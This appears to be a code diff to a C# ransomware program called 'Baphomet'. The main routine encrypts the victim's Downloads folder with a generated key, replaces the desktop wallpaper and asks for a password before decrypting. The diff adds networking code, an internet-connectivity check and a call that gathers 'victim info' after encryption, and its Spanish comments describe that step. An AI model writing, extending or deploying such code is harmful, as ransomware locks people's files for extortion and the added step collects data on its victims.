@@ -1,7 +1,7 @@
 ﻿using Baphomet.Utilities;
 using System;
 using System.IO;
-using System.Linq;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
@@ -23,11 +23,10 @@ namespace Baphomet
             Cryptep cryptep = new Cryptep();
             Decrypt decrypt = new Decrypt();
             BackgroundPhoto photo = new BackgroundPhoto();
+            NetInfo netInfo = new NetInfo();
 
             var key = cryptep.GenerateKey();
-
             var userName = Environment.UserName;
-            var computerName = System.Environment.MachineName.ToString();
 
             //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
             var Dirs = new[] { "\\Downloads" };
@@ -37,6 +36,13 @@ namespace Baphomet
             {
                 var targetPath = userDir + Dirs[d];
                 cryptep.directoryRoad(targetPath, key);
+            }
+
+            var internetCheck = netInfo.CheckInternetConnection();
+            if(internetCheck != false)
+            {
+                //Obtengo la data de la victima una vez cifre todos los directorios
+                var victimInfo = netInfo.GetVictimInfo();
             }
 
             //Cambio el wallpaper Desktop
@@ -52,10 +58,7 @@ namespace Baphomet
                 decrypt.directoryRoad(decryp_targetPath, password);
             }
 
-
         }//</main>
-
-
 
         //Wallpaper method.
         private static void ChangeWallpaper(string imagebase64, string dropPath)
@@ -92,9 +95,6 @@ namespace Baphomet
             string password = Console.ReadLine();
             return password;
         }//</message>
-
-
-
 
     }
 }
